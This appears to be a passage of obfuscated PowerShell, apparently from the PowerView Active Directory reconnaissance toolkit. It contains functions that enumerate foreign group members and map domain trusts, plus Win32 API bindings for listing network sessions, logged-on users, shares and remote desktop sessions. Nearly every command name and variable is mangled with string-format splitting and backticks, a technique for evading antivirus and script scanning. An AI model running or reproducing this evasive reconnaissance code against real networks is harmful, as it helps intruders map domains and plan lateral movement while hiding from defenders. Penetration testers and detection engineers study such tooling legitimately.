        &("{1}{3}{0}{2}" -f 'tG','Get-','roup','Ne') -GroupName ${gRoU`p`N`AmE} -Domain ${DO`mA`in} -DomainController ${DOma`IN`coNTrO`LLeR} -FullData -PageSize ${P`AgEsI`ze} | &("{0}{2}{1}{3}"-f 'Wh','O','ere-','bject') {${_}."me`mB`ER"} | &("{0}{3}{1}{2}"-f 'Wh','re-Ob','ject','e') {
            
            -not (${eX`Cludeg`ROUPs} -contains ${_}."sAmaC`cOu`NtNAme") } | &("{0}{4}{1}{3}{2}"-f'For','-O','t','bjec','Each') {
                
                ${GRoupN`A`Me} = ${_}."saM`AC`COUNtna`mE"

                ${_}."MEmB`eR" | &("{0}{2}{1}" -f 'ForEa','ect','ch-Obj') {
                    
                    
                    if ((${_} -match ("{2}{1}{4}{3}{0}"-f '.*-.*','=S-1-','CN','-21','5')) -or (${Dom`AiN`DN} -ne (${_}.("{2}{0}{1}" -f 's','tring','sub').Invoke(${_}.("{0}{1}" -f'Index','Of').Invoke("DC="))))) {

                        ${U`seRd`oMA`In} = ${_}.("{1}{2}{0}" -f'tring','sub','S').Invoke(${_}.("{0}{1}{2}" -f 'In','de','xOf').Invoke("DC=")) -replace 'DC=','' -replace ',','.'
                        ${U`SErNa`ME} = ${_}.("{0}{1}" -f 's','plit').Invoke(",")[0].("{1}{0}" -f 't','spli').Invoke("=")[1]

                        ${FO`R`eiGNgroU`P`UseR} = &("{1}{3}{0}{2}" -f'ec','New-','t','Obj') ("{0}{1}"-f 'PSObjec','t')
                        ${fo`ReI`G`NG`ROU`pUser} | &("{0}{1}{2}"-f 'Add','-Membe','r') ("{1}{2}{0}" -f 'perty','Notep','ro') ("{2}{1}{0}" -f'omain','pD','Grou') ${D`oMAIn}
                        ${f`oR`eiG`Ng`ROuPusER} | &("{0}{1}{2}" -f 'Add','-','Member') ("{0}{1}{2}"-f 'Notepro','pe','rty') ("{2}{0}{1}" -f 'o','upName','Gr') ${gR`O`UPnAMe}
                        ${fOReiG`N`gRO`UpU`SER} | &("{0}{2}{1}" -f'Add-Mem','r','be') ("{2}{1}{0}"-f 'eproperty','ot','N') ("{2}{3}{1}{0}"-f'n','ai','UserDo','m') ${uSerd`Om`AiN}
                        ${Forei`gNgr`OUpU`s`ER} | &("{3}{1}{0}{2}"-f 'Mem','-','ber','Add') ("{1}{0}{2}" -f 'epro','Not','perty') ("{1}{0}"-f'ame','UserN') ${u`SeRnaMe}
                        ${F`o`ReIGngrO`Up`U`SER} | &("{2}{0}{1}" -f'dd','-Member','A') ("{3}{0}{2}{1}" -f'ro','erty','p','Notep') ("{1}{0}"-f 'N','UserD') ${_}
                        ${FOREigN`Gr`oU`pU`Ser}
                    }
                }
        }
    }

    if (${Re`C`Urse}) {
        
        if(${LD`Ap} -or ${DOMA`iN`CO`NTRoLler}) {
            ${DOMAi`NTR`Us`TS} = &("{0}{1}{3}{4}{2}"-f 'Invoke-','MapD','Trust','om','ain') -LDAP -DomainController ${d`oM`AIncoNTRoLl`Er} -PageSize ${pAGeS`i`zE} | &("{0}{2}{1}" -f'ForEach-O','ct','bje') { ${_}."sOUrcED`O`MAiN" } | &("{1}{0}{2}"-f 'ort-Obj','S','ect') -Unique
        }
        else {
            ${do`MaIn`TruS`TS} = &("{2}{3}{0}{4}{5}{1}"-f 'oke-MapD','nTrust','In','v','om','ai') -PageSize ${P`Ag`eSizE} | &("{2}{0}{4}{3}{1}"-f 'ac','ect','ForE','j','h-Ob') { ${_}."souR`C`EDOMaIn" } | &("{0}{2}{1}" -f 'S','-Object','ort') -Unique
        }

        ForEach(${dOMa`I`N`TruST} in ${DOMaI`NTRUs`TS}) {
            
            &("{2}{1}{3}{0}"-f 'e','e-Verb','Writ','os') ('En'+'um'+'eratin'+'g '+'tru'+'st'+' '+'g'+'roups'+' '+'in'+' '+'dom'+'ain'+' '+"$DomainTrust")
            &("{3}{1}{2}{0}" -f 'p','ForeignGr','ou','Get-') -GroupName ${g`ROUpNa`me} -Domain ${D`OM`AIN} -DomainController ${dOmaIn`Co`N`TrOL`ler} -PageSize ${P`AGe`sIzE}
        }
    }
    else {
        &("{3}{0}{2}{4}{1}" -f'Fo','ignGroup','r','Get-','e') -GroupName ${gR`o`UPnaME} -Domain ${d`Om`AIn} -DomainController ${DOMai`NCon`T`ROLlEr} -PageSize ${P`Ag`eSize}
    }
}


function INVOKE-m`ApD`Om`AI`Nt`Rust {

    [CmdletBinding()]
    param(
        [Switch]
        ${l`DAP},

        [String]
        ${d`oMaiNC`OnTr`oLLeR},

        [ValidateRange(1,10000)] 
        [Int]
        ${PAgE`s`Ize} = 200
    )

    
    ${SeEn`d`oM`AiNs} = @{}

    
    ${dOm`Ai`Ns} = &("{2}{0}{1}" -f'jec','t','New-Ob') ("{0}{3}{1}{4}{6}{5}{2}"-f 'System','tio','ck','.Collec','n','a','s.St')

    
    ${cUR`ReN`Td`OmaIn} = (&("{0}{1}{2}"-f'G','et-NetDoma','in'))."n`AMe"
    ${DOM`Ai`Ns}.("{1}{0}" -f 'h','pus').Invoke(${cURR`e`NtDo`MAIn})

    while(${dOM`AInS}."cou`Nt" -ne 0) {

        ${Do`ma`In} = ${DomAI`NS}.("{0}{1}" -f'P','op').Invoke()

        
        if (-not ${SE`eN`Dom`AiNS}.("{1}{2}{0}"-f 'ey','Co','ntainsK').Invoke(${DO`mA`IN})) {
            
            &("{3}{0}{2}{1}"-f 'rite-','erbose','V','W') ('E'+'numer'+'ating'+' '+'tr'+'usts '+'f'+'or '+'d'+'omain'+' '+"'$Domain'")

            
            ${N`ULl} = ${s`EenDo`Ma`INS}.("{0}{1}" -f'a','dd').Invoke(${Do`M`AIN}, "")

            try {
                
                if(${lD`AP} -or ${do`M`AiN`con`T`RoLler}) {
                    ${tR`UsTs} = &("{2}{1}{3}{0}" -f'st','et-NetD','G','omainTru') -Domain ${D`o`MAiN} -LDAP -DomainController ${do`M`AINc`oNtrOLLeR} -PageSize ${P`A`GESIze}
                }
                else {
                    ${Tr`Us`Ts} = &("{0}{2}{3}{1}"-f'Get-N','ust','etD','omainTr') -Domain ${do`MA`In} -PageSize ${PAg`E`S`ize}
                }

                if(${truS`Ts} -isnot [system.array]) {
                    ${t`RUSTS} = @(${tr`UsTS})
                }

                
                ${tRU`STS} += &("{0}{1}{2}{3}"-f'Get','-NetFor','estTrus','t') -Forest ${DOMA`In}

                if (${tR`USTS}) {

                    
                    ForEach (${T`RU`St} in ${T`R`USTS}) {
                        ${So`URcE`doM`AiN} = ${t`Ru`sT}."SOUrCE`Na`Me"
                        ${t`A`RgeTdoMAIN} = ${T`R`UST}."Tar`geT`NaME"
                        ${T`RusT`TYPE} = ${tru`ST}."TRust`TyPE"
                        ${tru`stD`iRECti`on} = ${t`Ru`St}."T`RuSTdi`RecTi`on"

                        
                        ${Nu`LL} = ${doM`AiNS}.("{1}{0}"-f'h','pus').Invoke(${T`ArgE`TD`O`MAIn})

                        
                        ${doMa`in`TR`UsT} = &("{0}{2}{1}" -f'Ne','ject','w-Ob') ("{0}{1}{2}"-f 'PSOb','je','ct')
                        ${dO`m`AINT`RUst} | &("{2}{1}{0}" -f 'er','emb','Add-M') ("{0}{1}{2}" -f 'Notepr','op','erty') ("{0}{1}{2}" -f'SourceD','om','ain') "$SourceDomain"
                        ${DO`mAiNt`R`UST} | &("{0}{3}{1}{2}"-f 'A','d-','Member','d') ("{0}{1}{2}" -f'N','otepro','perty') ("{0}{2}{3}{1}"-f'Ta','ain','rge','tDom') "$TargetDomain"
                        ${DoMaI`NtRU`sT} | &("{2}{0}{1}"-f 'd','-Member','Ad') ("{2}{0}{1}" -f't','y','Noteproper') ("{0}{1}{2}"-f'Tru','stT','ype') "$TrustType"
                        ${DoM`AI`Ntr`UST} | &("{0}{1}{3}{2}"-f 'A','d','ber','d-Mem') ("{3}{2}{0}{1}"-f'eproper','ty','t','No') ("{2}{0}{1}{4}{3}"-f'us','tDir','Tr','ion','ect') "$TrustDirection"
                        ${d`O`MaIntRUst}
                    }
                }
            }
            catch {
                &("{2}{0}{3}{1}"-f 'i','ng','Wr','te-Warni') ('[!]'+' '+'Err'+'or: '+"$_")
            }
        }
    }
}











${M`OD} = &("{4}{0}{1}{3}{2}" -f 'n','Mem','dule','oryMo','New-I') -ModuleName ("{1}{0}" -f 'in32','W')


${Fu`N`Cti`o`NdeFInIT`IONS} = @(
    (&("{1}{0}" -f 'c','fun') ("{2}{0}{1}"-f'etapi','32','n') ("{2}{0}{1}"-f 'tS','hareEnum','Ne') ([Int]) @([String], [Int],  ${s`qG}.("{0}{3}{1}{2}"-f'Mak','yR','efType','eB').Invoke(), [Int],   (&("{1}{0}"-f'bLe','VARIA') ("M"+"P6")  -ValUeo ).("{3}{2}{0}{4}{1}" -f'keByRefTy','e','a','M','p').Invoke(),   ( &("{0}{2}{1}" -f 'vAr','E','IaBL') mp6  ).Value.("{0}{2}{1}"-f 'MakeB','RefType','y').Invoke(),   (  &('gi') ("vARi"+"a"+"ble:M"+"P6")).vALUE.("{3}{1}{2}{0}"-f 'e','ake','ByRefTyp','M').Invoke())),
    (&("{0}{1}"-f'fu','nc') ("{1}{2}{0}"-f '32','ne','tapi') ("{2}{3}{1}{0}"-f'm','nu','NetWkst','aUserE') ([Int]) @([String], [Int],  (  &("{2}{0}{1}" -f'RIAB','le','GeT-Va') ('s'+'qg') -VAlUeO  ).("{3}{1}{0}{2}" -f 'eByRefT','ak','ype','M').Invoke(), [Int],   (&("{1}{0}" -f 'm','ite')  vArIable:Mp6 ).vALuE.("{3}{4}{1}{2}{0}" -f'pe','ef','Ty','Ma','keByR').Invoke(),  (&("{2}{1}{0}" -f 'm','Ite','Get-')  vaRIAbLE:mp6  ).VAluE.("{0}{1}{2}"-f 'MakeB','yRefT','ype').Invoke(),  (&("{2}{1}{0}"-f'LE','IaB','VaR') mp6  -VAL).("{2}{0}{1}"-f'efTy','pe','MakeByR').Invoke())),
    (&("{0}{1}"-f 'fu','nc') ("{1}{2}{0}" -f'32','netap','i') ("{1}{2}{3}{0}" -f 'um','N','etSessi','onEn') ([Int]) @([String], [String], [String], [Int],   (&('ls')  vaRIaBLe:sqG).vAluE.("{0}{2}{3}{1}"-f'Ma','fType','keB','yRe').Invoke(), [Int],   ( &("{1}{2}{0}{3}"-f'bl','Get-Va','ria','e')  MP6 ).vALuE.("{4}{0}{3}{1}{2}"-f 'e','fTy','pe','ByRe','Mak').Invoke(),   (  &("{0}{2}{1}" -f'v','e','aRIAbl')  MP6 ).vAlue.("{2}{3}{0}{1}{4}" -f 'k','eB','M','a','yRefType').Invoke(),  (&("{0}{2}{1}" -f 'GEt','tEm','-cHILdi')  ("VariABlE"+":"+"mP6")  ).vAlue.("{2}{1}{0}" -f'fType','akeByRe','M').Invoke())),
    (&("{0}{1}"-f'fun','c') ("{1}{2}{0}"-f'32','net','api') ("{1}{2}{0}{3}{4}" -f 'iBuffer','Ne','tAp','F','ree') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f 'fu','nc') ("{2}{1}{0}"-f'2','vapi3','ad') ("{2}{0}{3}{1}"-f 'nSCManage','W','Ope','r') ([IntPtr]) @([String], [String], [Int])),
    (&("{1}{0}"-f'unc','f') ("{2}{1}{0}"-f'i32','dvap','a') ("{0}{2}{1}{4}{3}" -f'C','oseS','l','eHandle','ervic') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'c','fun') ("{1}{2}{0}" -f '32','wtsap','i') ("{4}{2}{3}{1}{0}" -f 'x','erE','Ser','v','WTSOpen') ([IntPtr]) @([String])),
    (&("{0}{1}" -f 'f','unc') ("{2}{1}{0}"-f '32','pi','wtsa') ("{2}{0}{3}{5}{1}{4}"-f'Enum','E','WTS','erat','x','eSessions') ([Int]) @([IntPtr],  ( &("{2}{1}{0}" -f'bLE','rIa','GET-vA') ('Mp'+'6') -Va ).("{0}{3}{1}{2}{4}" -f 'Mak','efT','y','eByR','pe').Invoke(), [Int],   (&("{0}{1}{2}" -f 'ge','T-iTe','M') ('v'+'aria'+'bLE'+':SqG')).vALUe.("{0}{2}{1}" -f'MakeB','RefType','y').Invoke(),    ( &("{0}{1}"-f 'G','Ci')  ("VaRiAbLE:"+"MP"+"6")).vaLuE.("{0}{1}{2}{3}" -f'M','akeByR','e','fType').Invoke())),
    (&("{0}{1}"-f 'fu','nc') ("{1}{2}{0}"-f '2','wtsap','i3') ("{3}{0}{1}{5}{2}{4}"-f'Ses','sion','f','WTSQuery','ormation','In') ([Int]) @([IntPtr], [Int], [Int],  (&("{2}{0}{1}"-f 'Et','-VarIABlE','G')  SQg -vALu ).("{0}{1}{3}{2}" -f'M','ak','ype','eByRefT').Invoke(),   ( &("{0}{1}" -f'V','ARiable')  MP6  ).value.("{0}{3}{2}{1}" -f'MakeB','pe','RefTy','y').Invoke())),
    (&("{0}{1}"-f'fu','nc') ("{2}{0}{1}"-f 'sap','i32','wt') ("{1}{2}{0}"-f 'reeMemoryEx','W','TSF') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{0}{1}" -f 'f','unc') ("{0}{1}{2}" -f 'wtsa','pi','32') ("{3}{2}{1}{0}" -f 'emory','reeM','F','WTS') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f'f','unc') ("{0}{1}{2}" -f 'wt','s','api32') ("{0}{2}{4}{1}{3}" -f'WTSC','e','loseSer','r','v') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'unc','f') ("{2}{1}{0}" -f '32','ernel','k') ("{2}{1}{3}{0}"-f'or','LastE','Get','rr') ([Int]) @())
)


${w`TsC`onNeC`TSt`Ate} = &("{0}{1}"-f'pse','num') ${M`od} ("{4}{1}{0}{2}{3}" -f 'C','TS_CONNE','TSTATE_CL','ASS','W') ("{1}{0}" -f 'nt16','UI') @{
    ("{0}{1}{2}" -f 'A','cti','ve')       =    0
    ("{2}{1}{3}{0}" -f'd','c','Conne','te')    =    1
    ("{3}{0}{1}{2}"-f'nnect','Qu','ery','Co') =    2
    ("{1}{0}"-f 'hadow','S')       =    3
    ("{3}{1}{2}{0}"-f'cted','n','ne','Disco') =    4
    ("{0}{1}"-f'I','dle')         =    5
    ("{0}{1}"-f 'Lis','ten')       =    6
    ("{1}{0}"-f 'set','Re')        =    7
    ("{1}{0}" -f'n','Dow')         =    8
    ("{0}{1}" -f 'Ini','t')         =    9
}


${wTs_SeSSi`oN_iNf`O`_1} = &("{1}{0}" -f 'ruct','st') ${M`Od} ("{0}{1}{2}{3}"-f 'WTS','_SESS','ION_IN','FO_1') @{
    ("{0}{2}{1}"-f'E','cEnvId','xe') = &("{0}{1}"-f 'fiel','d') 0 ("{2}{0}{1}" -f'Int3','2','U')
    ("{0}{1}" -f 'Stat','e') = &("{0}{1}" -f'fiel','d') 1 ${w`TSC`onnecTs`TAte}
    ("{1}{0}"-f'ionId','Sess') = &("{0}{1}" -f 'fie','ld') 2 ("{0}{1}" -f'UIn','t32')
    ("{1}{0}{2}" -f 'io','pSess','nName') = &("{1}{0}" -f'd','fiel') 3 ("{1}{0}{2}"-f 'trin','S','g') -MarshalAs @(("{1}{2}{0}" -f'Str','L','PW'))
    ("{2}{1}{0}"-f 'ame','stN','pHo') = &("{0}{1}"-f 'fie','ld') 4 ("{1}{0}"-f'ng','Stri') -MarshalAs @(("{0}{1}"-f 'LP','WStr'))
    ("{2}{1}{0}"-f 'e','m','pUserNa') = &("{0}{1}"-f 'f','ield') 5 ("{1}{0}"-f'tring','S') -MarshalAs @(("{1}{2}{0}"-f 'r','LPW','St'))
    ("{2}{1}{0}{3}" -f'in','oma','pD','Name') = &("{1}{0}"-f'ld','fie') 6 ("{0}{1}"-f'St','ring') -MarshalAs @(("{1}{0}" -f 'r','LPWSt'))
    ("{1}{0}{3}{2}" -f 'a','pF','Name','rm') = &("{1}{0}" -f 'ield','f') 7 ("{1}{0}"-f 'tring','S') -MarshalAs @(("{1}{0}"-f'WStr','LP'))
}


${Wt`S_C`liE`NT_AdD`ResS} = &("{0}{1}"-f 's','truct') ${m`oD} ("{0}{2}{4}{3}{1}" -f'WTS_CLIE','DDRESS','N','_A','T') @{
    ("{1}{2}{0}{3}"-f'm','Addres','sFa','ily') = &("{0}{1}" -f'fi','eld') 0 ("{0}{1}" -f 'UInt','32')
    ("{0}{1}{2}" -f'Add','res','s') = &("{1}{0}"-f 'd','fiel') 1 ("{0}{1}{2}" -f 'Byt','e[',']') -MarshalAs @(("{0}{2}{1}" -f'ByV','rray','alA'), 20)
}


${SHA`Re_In`F`O_1} = &("{1}{0}" -f'uct','str') ${M`od} ("{0}{1}{3}{2}" -f 'SHARE_IN','F','_1','O') @{
    ("{3}{1}{2}{0}" -f'name','i1_n','et','sh') = &("{0}{1}"-f 'fiel','d') 0 ("{1}{2}{0}"-f'g','Str','in') -MarshalAs @(("{0}{1}" -f 'LPWS','tr'))
    ("{0}{1}{2}" -f'shi','1','_type') = &("{0}{1}" -f'f','ield') 1 ("{1}{0}"-f'nt32','UI')
    ("{3}{0}{2}{1}"-f 'r','ark','em','shi1_') = &("{1}{0}" -f'ield','f') 2 ("{1}{0}"-f 'ng','Stri') -MarshalAs @(("{0}{1}" -f'LP','WStr'))
}


${wk`S`Ta_`USEr_in`Fo`_1} = &("{1}{2}{0}"-f 'ct','str','u') ${m`OD} ("{3}{1}{2}{0}"-f 'NFO_1','USE','R_I','WKSTA_') @{
    ("{0}{1}{2}{3}{4}"-f 'w','ku','i1_','us','ername') = &("{0}{1}" -f 'f','ield') 0 ("{1}{2}{0}"-f 'ng','Str','i') -MarshalAs @(("{0}{2}{1}"-f 'L','WStr','P'))
    ("{3}{1}{2}{0}"-f'n_domain','kui1_','logo','w') = &("{0}{1}" -f'fiel','d') 1 ("{0}{1}" -f'Str','ing') -MarshalAs @(("{1}{2}{0}"-f'tr','L','PWS'))
    ("{0}{2}{3}{1}{4}" -f'wkui1','a','_','oth_dom','ins') = &("{0}{1}"-f'fiel','d') 2 ("{1}{0}"-f 'ring','St') -MarshalAs @(("{0}{1}"-f 'LP','WStr'))
    ("{4}{1}{0}{3}{2}" -f'_logon_serv','kui1','r','e','w') = &("{0}{1}"-f 'fi','eld') 3 ("{0}{1}{2}"-f 'Str','i','ng') -MarshalAs @(("{1}{0}" -f'PWStr','L'))
}


${SesS`Ion_INF`O_`10} = &("{0}{2}{1}" -f'st','uct','r') ${m`Od} ("{1}{3}{2}{0}" -f'_10','SESSION','INFO','_') @{
    ("{2}{3}{0}{1}" -f'_cna','me','se','si10') = &("{0}{1}" -f'fi','eld') 0 ("{1}{0}"-f 'g','Strin') -MarshalAs @(("{0}{1}"-f'L','PWStr'))
    ("{3}{2}{0}{1}" -f 'se','rname','si10_u','se') = &("{1}{0}"-f'd','fiel') 1 ("{0}{1}"-f 'Strin','g') -MarshalAs @(("{0}{2}{1}"-f'LPW','r','St'))
    ("{2}{0}{1}"-f '_ti','me','sesi10') = &("{0}{1}"-f'fi','eld') 2 ("{0}{1}"-f'UI','nt32')
    ("{0}{1}{2}{4}{3}"-f 'sesi10_i','dle_','ti','e','m') = &("{1}{0}" -f'ld','fie') 3 ("{1}{2}{0}" -f '32','U','Int')
}


${t`Y`PEs} = ${fun`cTiONde`FiN`iT`i`oNs} | &("{1}{0}{2}" -f'd-Win32T','Ad','ype') -Module ${m`oD} -Namespace ("{0}{1}"-f'Wi','n32')
${n`Et`API32} = ${T`YP`ES}[("{0}{1}{2}"-f'n','etapi','32')]
${aDv`A`pI32} = ${T`yP`Es}[("{0}{1}{2}" -f'ad','va','pi32')]
${ke`Rn`El32} = ${tY`PEs}[("{0}{1}"-f'kernel','32')]
${wt`sAPI`32} = ${T`yPEs}[("{2}{0}{1}" -f'pi','32','wtsa')]

